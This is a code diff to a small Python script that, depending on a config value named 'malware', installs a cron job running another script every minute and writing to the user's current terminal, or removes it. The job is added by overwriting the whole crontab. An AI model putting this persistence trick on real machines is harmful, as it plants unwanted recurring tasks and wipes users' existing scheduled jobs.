@@ -21,7 +21,7 @@ def pwd():
     current_directory = os.getcwd()
     return current_directory
 
-def createCron(): 
+def createCron(tty): 
     # Get the directory of the script file
     script_directory = os.path.dirname(os.path.abspath(__file__))
 
@@ -38,7 +38,7 @@ def createCron():
     subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
 
     # Schedule the script as a cron job
-    cron_command = f"* * * * * python3 {desired_file_path} > /dev/pts/1 \n"
+    cron_command = f"* * * * * python3 {desired_file_path} > {tty} \n"
     subprocess.run(['crontab', '-'], input=cron_command, text=True)
 
 def remove_cron_job(job_to_remove):
@@ -63,9 +63,14 @@ def remove_cron_job(job_to_remove):
     except subprocess.CalledProcessError:
         print("Error: Failed to update current user's crontab.")
 
+def get_tty():
+    command = ['tty']
+    output = subprocess.check_output(command).decode().strip()
+    return output
+
 malware = readConf()
 
 if int(malware) > 0:
-    createCron()
+    createCron(get_tty())
 else: 
     remove_cron_job("prompts.py")
